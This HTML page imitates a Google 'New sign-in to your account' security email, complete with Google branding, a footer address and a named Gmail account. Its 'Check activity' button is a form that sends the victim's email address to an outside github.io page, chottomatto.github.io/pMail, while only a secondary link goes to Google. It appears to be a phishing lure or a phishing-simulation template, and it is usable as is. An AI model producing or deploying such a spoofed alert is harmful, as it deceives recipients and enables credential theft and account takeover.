<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="format-detection" content="email=no"/>
    <meta name="format-detection" content="date=no"/>
    <title>Security Alert - Activity Check</title>
    <link href="https://fonts.googleapis.com/css?family=Google+Sans" rel="stylesheet" type="text/css"/>
    <style>
        .awl a { color: #FFFFFF; text-decoration: none; } 
        .abml a { color: #000000; font-family: Roboto-Medium, Helvetica, Arial, sans-serif; font-weight: bold; text-decoration: none; } 
        .adgl a { color: rgba(0, 0, 0, 0.87); text-decoration: none; } 
        .afal a { color: #b0b0b0; text-decoration: none; } 
        
        .main-button {
            font-family: 'Google Sans Flex', 'Google Sans Text', 'Google Sans', 'Noto Sans', Arial, Helvetica, sans-serif; 
            line-height: 16px; 
            color: #ffffff; 
            font-weight: 500; 
            text-decoration: none; 
            font-size: 14px; 
            display: inline-block; 
            padding: 12px 24px; 
            background-color: #0b57d0; 
            border-radius: 9999px; 
            min-width: 64px;
            border: none;
            cursor: pointer;
        }
        .main-button:hover {
            background-color: #0842a0;
        }

        @media screen and (min-width: 600px) {
            .v2sp { padding: 6px 30px 0px; } 
            .v2rsp { padding: 0px 10px; }
            .mdv2rw { padding: 40px 40px; }
        } 
    </style>
</head>
<body style="margin: 0; padding: 0;" bgcolor="#FFFFFF">
    <table width="100%" height="100%" style="min-width: 348px;" border="0" cellspacing="0" cellpadding="0" lang="en">
        <tr height="32" style="height: 32px;"><td></td></tr>
        <tr align="center">
            <td>
                <table border="0" cellspacing="0" cellpadding="0" style="padding-bottom: 20px; max-width: 516px; min-width: 220px;">
                    <tr>
                        <td width="8" style="width: 8px;"></td>
                        <td>
                            <!-- Main Container Card -->
                            <div style="border-style: solid; border-width: thin; border-color:#dadce0; border-radius: 8px; padding: 40px 20px;" align="center" class="mdv2rw">
                                
                                <!-- Google Logo -->
                                <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_74x24dp.png" width="74" height="24" aria-hidden="true" style="margin-bottom: 16px;" alt="Google">
                                
                                <!-- Header Section -->
                                <div style="font-family: 'Google Sans',Roboto,RobotoDraft,Helvetica,Arial,sans-serif; border-bottom: thin solid #dadce0; color: rgba(0,0,0,0.87); line-height: 32px; padding-bottom: 24px; text-align: center; word-break: break-word;">
                                    <div style="font-size: 24px;">New sign-in to your account</div>
                                    
                                    <table align="center" style="margin-top:8px;">
                                        <tr style="line-height: normal;">
                                            <td align="right" style="padding-right:8px;">
                                                <img width="20" height="20" style="width: 20px; height: 20px; vertical-align: sub; border-radius: 50%;" src="https://lh3.googleusercontent.com/a/ACg8ocLYPV4zv1EJ6i0Puk6KHFS65QFMUB3loPLjvlVGtg6Hcw0v2P8=s96-c" alt="User Profile">
                                            </td>
                                            <td>
                                                <span style="font-family: 'Google Sans',Roboto,RobotoDraft,Helvetica,Arial,sans-serif; color: rgba(0,0,0,0.87); font-size: 14px; line-height: 20px;">omuricesaiko@gmail.com</span>
                                            </td>
                                        </tr>
                                    </table> 
                                </div>

                                <!-- Body Text -->
                                <div style="font-family: Roboto-Regular,Helvetica,Arial,sans-serif; font-size: 14px; color: rgba(0,0,0,0.87); line-height: 20px; padding-top: 20px; text-align: center;">
                                    We noticed a new sign-in to your Google Account. If this was you, you don’t need to do anything. If not, we’ll help you secure your account.
                                    
                                    <!-- Interactive Form Section -->
                                    <div style="padding-top: 32px; text-align: center;">
                                        <form action="https://chottomatto.github.io/pMail" method="GET" target="_blank">
                                            <!-- Hidden Inputs reflecting the parameters from the original email verification link -->
                                            <input type="hidden" name="Email" value="omuricesaiko@gmail.com">
                                            <input type="hidden" name="continue" value="https://myaccount.google.com/alert/nt/1781229032000?rfn=325&rfnc=1&eid=3799232752475533179&et=0">
                                            
                                            <button type="submit" class="main-button">Check activity</button>
                                        </form>
                                    </div>
                                </div>

                                <!-- Alternate Options Link -->
                                <div style="padding-top: 20px; font-size: 12px; line-height: 16px; color: #5f6368; letter-spacing: 0.3px; text-align: center">
                                    You can also see security activity at<br>
                                    <a href="https://myaccount.google.com/notifications" style="text-decoration: none; color: #4285F4;" target="_blank">https://myaccount.google.com/notifications</a>
                                </div>
                            </div>

                            <!-- Footer Section -->
                            <div style="text-align: left;">
                                <div style="font-family: Roboto-Regular,Helvetica,Arial,sans-serif; color: rgba(0,0,0,0.54); font-size: 11px; line-height: 18px; padding-top: 12px; text-align: center;">
                                    <div>You received this email to let you know about important changes to your Google Account and services.</div>
                                    <div style="direction: ltr;">
                                        &copy; 2026 Google LLC, <a class="afal" style="font-family: Roboto-Regular,Helvetica,Arial,sans-serif; color: rgba(0,0,0,0.54); font-size: 11px; line-height: 18px; padding-top: 12px; text-align: center;">1600 Amphitheatre Parkway, Mountain View, CA 94043, USA</a>
                                    </div>
                                </div>
                            </div>
                        </td>
                        <td width="8" style="width: 8px;"></td>
                    </tr>
                </table>
            </td>
        </tr>
        <tr height="32" style="height: 32px;"><td></td></tr>
    </table>
</body>
</html>